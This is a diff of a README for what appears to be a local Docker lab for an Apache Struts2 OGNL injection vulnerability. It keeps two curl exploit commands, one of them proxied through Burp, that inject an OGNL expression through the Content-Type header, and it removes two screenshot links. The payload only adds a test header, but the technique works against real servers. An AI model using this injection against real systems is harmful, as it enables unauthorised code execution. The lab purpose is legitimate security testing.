@@ -10,13 +10,11 @@ docker-compose up -d
 ### Exploit:
 ```
 curl -XPOST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080
-![image](https://user-images.githubusercontent.com/31791455/140392000-8494ff8f-6a97-44b1-a3a6-7405971e8ab7.png)
 
 ```
 ### Proxy curl via Burp:
 ```
 curl -XPOST --proxy http://127.0.0.1:8080 -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('PWND',73*38)}.multipart/form-data" -v http://localhost:8080
-![image](https://user-images.githubusercontent.com/31791455/140391963-fa980891-aa93-47fe-9a5e-1b2b4d8677fb.png)
 
 ```
 
